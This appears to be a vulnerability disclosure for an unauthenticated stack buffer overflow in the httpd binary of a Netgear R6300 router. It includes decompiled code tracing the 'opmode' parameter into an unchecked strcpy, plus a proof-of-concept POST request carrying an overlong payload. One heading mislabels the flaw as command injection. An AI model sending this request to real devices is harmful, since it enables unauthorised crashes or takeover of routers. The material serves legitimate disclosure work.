# Buffer Overflow Vulnerability in `wla_temp_mode`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6300 Router                                         |
| Firmware Version     | V1.0.2.80_1.0.59                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`wirelessCgiMain` → `acosNvramConfig_set` → `wlgOpModeGet`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `opmode` |

2. Exploitation Path

```c
int __fastcall wirelessCgiMain(int a1, int a2)
{
  ...
  char v96[256]; // [sp+540h] [-400h] BYREF
	...
  websGetVar(a1, "opmode", v96);
  acosNvramConfig_set("wla_temp_mode", v96);
  ...
}

int __fastcall wlgOpModeGet(int a1, const char *a2, char *a3)
{
  ...
  char v26[128]; // [sp+18h] [-80h] BYREF

  v4 = atoi(a2);
  if ( !v4 )
  {
    v5 = (const char *)acosNvramConfig_get("wla_temp_setting");
    if ( !strcmp(v5, "1") )
      v6 = "wla_temp_mode";
    else
      v6 = "wla_mode";
    v7 = (const char *)acosNvramConfig_get(v6);
    strcpy(v26, v7);
    ...
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: In the `wirelessCgiMain` function at line 6, the call `websGetVar(a1, "opmode", v96)` retrieves input. While a 255-byte length restriction is applied, no further validation or sanitization is enforced. The input is subsequently stored via `acosNvramConfig_set("wla_temp_mode", v96)` at line 7. Later, in the `wlgOpModeGet` function, the stored value is retrieved at line 24 using `v7 = (const char *)acosNvramConfig_get(v6)`, and directly copied into the destination buffer `v26` via `strcpy(v26, v7)` at line 25. Since the destination buffer `v26` is only 128 bytes in size, this leads to a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/wirelessCgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

opmode=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```